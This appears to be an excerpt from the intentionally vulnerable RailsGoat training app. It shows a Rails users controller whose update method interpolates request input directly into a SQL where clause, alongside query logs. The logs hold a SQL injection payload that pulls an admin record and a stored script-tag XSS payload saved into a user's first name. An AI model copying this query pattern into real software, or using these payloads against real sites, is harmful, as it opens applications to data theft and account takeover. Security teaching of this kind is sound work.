app/controllers/users_controller.rb

  def create
    user = User.new(user_params)
    user.build_benefits_data
    if user.save
---
INSERT INTO "users" ("admin", "auth_token", "created_at", "email", "first_name", "last_name", "password", "updated_at", "user_id") VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)

  def update
    message = false

    user = User.where("user_id = '#{params[:user][:user_id]}'")[0]

    if user
      user.skip_user_id_assign = true
      user.skip_hash_password = true
      user.update_attributes(user_params_without_password)
---
SELECT "users".* FROM "users" WHERE (user_id = '8' OR admin='t') --') LIMIT 1
UPDATE "users" SET "first_name" = 'B<script>$(function() { $(''form.button_to input.btn.btn-primary'').val(''RailsGoat h4x0r3d'') } )</script>', "updated_at" = '2014-10-14 20:37:05.763944' WHERE "users"."id" = 6